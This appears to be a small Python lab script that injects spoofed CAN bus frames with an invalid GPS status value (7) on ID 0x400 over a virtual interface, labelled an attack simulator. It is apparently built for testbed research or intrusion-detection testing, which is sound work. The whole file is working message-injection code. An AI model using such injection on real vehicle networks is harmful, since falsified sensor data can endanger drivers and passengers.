import can
import time

CAN_ID = 0x400

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)

print("=" * 60)
print(" INVALID GPS STATUS ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x400")
print("Fake Status   : 7")
print("Valid values  : 0 or 1")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()

try:
    while True:

        gps_status = 7

        message = can.Message(
            arbitration_id=CAN_ID,
            data=[gps_status],
            is_extended_id=False
        )

        bus.send(message)

        print(
            f"ATTACK -> GPS Status={gps_status}"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Invalid GPS attack stopped.")

finally:

    bus.shutdown()
